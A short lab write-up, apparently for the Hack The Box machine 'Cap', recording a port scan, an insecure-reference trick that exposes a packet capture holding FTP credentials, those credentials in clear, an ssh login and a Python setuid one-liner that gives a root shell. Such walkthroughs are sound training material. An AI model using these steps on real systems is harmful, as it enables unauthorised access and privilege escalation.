@@ -1,0 +1,28 @@
+Cap
+10.10.10.245
+
+Open ports 
+----------
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    gunicorn
+
+visiting the site and looked throught it and in the pcap bar option changing the value from 1 to 0 gives a pcap file of an ftp login
+download the pcap file and following the tcp stream gives off the credentials 
+-------------------------
+nathan : Buck3tH4TF0RM3!
+-------------------------
+
+ssh into the machine 
+ssh nathan@10.10.10.245
+user.txt can be found in the nathan home directory
+
+Privilege escalation
+---------------------
+trying a python capabilities exploit from gtfobin gives us the root
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+We are root!!
+
+root.txt can found in /root/root.txt
+
